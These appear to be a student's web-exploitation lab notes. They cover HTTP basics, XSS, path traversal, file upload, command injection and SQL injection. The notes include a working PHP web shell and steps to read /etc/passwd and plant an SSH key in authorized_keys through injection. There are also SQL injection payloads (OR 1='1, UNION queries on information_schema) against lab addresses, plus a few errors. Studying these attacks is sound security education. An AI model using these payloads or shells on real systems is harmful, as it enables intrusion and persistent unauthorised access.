###############################################################################################################################################################################

                                                                                #Web Exploitation#

###############################################################################################################################################################################

#Server/Client Relationship
    #Synchronous communications between user and services
    #Not all data is not returned, client only receives what is allowed

#HTTP
    #Admin ("Head Honcho") of web page
          www-data
    #Request/Response 
        #Various tools to view
            #tcpdump
            #wireshark
            #Developer Console
    #Methods
        #A select few
            GET          (Server to client)
            POST         (Client to server)
            HEAD         
            PUT
            https://tools.ietf.org/html/rfc2616
    #Response Codes
        10x                    #Informational
        2XX                    #Success
        30X                    #Redirection
        4XX                    #Client Error
        5XX                    #Server Error
        https://tools.ietf.org/html/rfc2616
    #Fields
        User-Agent              #Can find info about what browser is being used
        Referer                 #Can see what sent to current website
        Cookie
        Date
        Server
        Set-Cookie
    #Tools can use to get info
        wget 
        curl

#JavaScript

#Cross-Site Scripting (XSS)
    #Insertion of arbitrary code into a web page, that executes in the browser of visitors
        #Unsanitized GET,POST,PUT methods allow JS to be placed on websites
        #Often found in forums that allow HTML
    #Reflected XSS
        #Most Common form of XSS
        #Transient, occurs in error messages or search results
        #Delivered through intermidafe media, such as a link in an email
        #Characters normally illegal in urls can be base64 encoded
        #not persistant, often within url
    #Stored XSS
        #Resides on vulnerable site
        #Only requires user to visit page

#Server Side Injection
    #Directory Traversal/Path Traversal
        #vulnerabilities exist when an attacker is able to read files on a web server that are outside of the intended scope by the developers
        #gives an attacker arbitrary read of any file that the web server process has read permission for
        #Ability to read/execute outside web server’s directory
        #Uses ../../ (relative paths) in manipulating a server-side file path
            ../../<file you want>
                #throw  a bunch of ../ to not have to worry about guessing right amount
    #Malicious File Upload
        #Site Allows unsanitized file uploads
        #Server Don't validate extension or size
        #allows for code execution
        #once uploadsed
            #find your file
            #call your file
        #java script to run a cmd and be able to use web page as a cmd prompt
              <HTML><BODY>
              <FORM METHOD="GET" NAME="myform" ACTION="">
              <INPUT TYPE="text" NAME="cmd">
              <INPUT TYPE="submit" VALUE="Send">
              </FORM>
              <pre>
              <?php
              if($_GET['cmd']) {
                system($_GET['cmd']);
                }
              ?>
              </pre>
              </BODY></HTML>
    #Command Injection
        #Application on the server is vulnerable
            #allowing execution of arbitrary commands
        #user input is not validated
            #common example is SOHO router, with a web page to allow ping
        #need a ; before command to make it work
    #SSH Key Upload
        #Through either malicious upload or command injection, we can potentially upload our ssh key onto the target system
            #with that we can gain access without the need of a password
        #Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for password as well
            ssh-keygen -t rsa
        #After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension
            cat ~/.ssh/id_rsa.pub
        #On the target website we need to do some tasks in order to upload our ssh properly
            #These commands can be ran from a place where command injection is possible or if you uploaded some malicious php they can be done from there
            whoami
                #Once the user is known find this users home folder by looking in /etc/passwd
                ; cat /etc/passwd
                #We also want to make sure the user has a login shell
            www-data:x:33:33:www-data:/var/www:/bin/bash
            #Check to see if .ssh folder is in the users home directory. If not make it
                ls -la /users/home/directory      #check if .ssh exists
                    ls -la /var/www:
                mkdir /users/home/directory/.ssh  #make .ssh in users home folder if it does not exist
                    mkdir /var/www:/.ssh
            #Echo ssh key to the authorized_keys file in the users .ssh folder
                echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
                    echo "the shit" >> /var/www:/.ssh/authorized_keys
            #Verify key has been uploaded successfully
                cat /users/home/directory/.ssh/authorized_keys
                  cat /var/www:/.ssh/authorized_keys

#SQL (Structured Query Language)
    #Standard Commands
        SELECT                          #Extracts Data from Database
        UNION                           #Used to COMBINE the result-set of TWO OR MORE SELECT COMMANDS
        UPDATE                          #Updates data in database
        USE                             #Selects the DB to use
        DELETE                          #Deletes data from a database
        INSERT INTO                     #Inserts new data into a database
        CREATE DATABSE                  #Creates a new database
        ALTER DATABASE                  #Modifies a database
        CREATE TABLE                    #Creates a new table
        DROP TABLE                      #Deletes a table
        ALTER TABLE                     #Modifies a table
        CREATE INDEX                    #Creates an index (search key)
        DROP INDEX                      #Deletes an index
        SELECT column, column, column FROM database.table
              #use * for column to select all 
        
    #SQL Injections
        #Considerations
            #Requires Valid SQL Queries
            #Fully Patched systems can be vulnerable due to misconfiguration
            #Input Field Sanitization
            #String vs INT Values
            #is INFORMATION_SCHEMA database avalable
            #GET request vs POST request HTTP methods
        #Unsanitized Fields
            #Input fields can be found using a single quote
                #will return extraneous information
                #single quote closes a var to allow for additional statemensts/clauses
                #may show no errors or generic error (harder injection)
        #Sanitized fields
            #Input fields are checked for items that might harm the database (items are removed, escaped, or turned into a single string)
        #Validation
            #checks to endure it meers a criteria
        #Server-side Query processing
            #Scnario
                #User enters JohnDoe243 in the name form field and pass1234 in the pass form field.
                    #Server-Side query would be
                        BEFORE INPUT:
                            SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
                        AFTER INPUT:
                            SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
                #Injecting Your Statement (for PHP)
                    User enters TOM' OR 1='1 in the name and password fields
                        is the POST METHOD
                        #truth statement;tom' OR 1='1
                    #Server side query executed would appear like this
                        #SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
                    GET METHOD
                        #Done in URL
                        hit f12 and go to network
                        DO THE post WETHOD
                        Vieq the post LOGON SHIT, GO TO REQUEST 
                        from request can see the username and password
                        enter username and password into url as follow
                            10.50.40.232/login.php
                                                  ?=username-tom' OR 1='1&passwd=tom' OR 1='1
                              (first line is link as before, second line is what I entered to do get method of sql injection)
                #Working with drop down/just a POST field no uname and passwd
                    #Test options given with format from above
                        #When one returns an option open developer tools and view request shit
                        #Test URl see if works
                    #With drop dows select options see what happens
                        #if see hanging in url try the format from above in selection area of url
                            #should not use quotes cause not a POST
                                #if no work without quotes on all try with
                            Selection=1 UNION select 1,2,3
                                #change url to like this to exploit
                                #keep going up in nums until get something
                    #GOLD STATEMENT (used after going through with union to find select number that worked
                        http://10.50.40.232/uniondemo.php?Selection=
                                                                      3 UNION select table_schema,table_name,column_name from information_schema.columns
                        (first levell is as was before, indented and second line is what addded and what is the goldent statement)
                        #Gives databases, and from there in another browser using same setup can look at the databases themselves
                        http://10.50.40.232/uniondemo.php?Selection=
                                                                    3 UNION select name,type,cost from session.car
                          (example based off of golden statement from above)
                          
                        http://10.50.40.232/uniondemo.php?Selection=
                                                                    3 UNION select 1,2,@@version
                          (get version information)











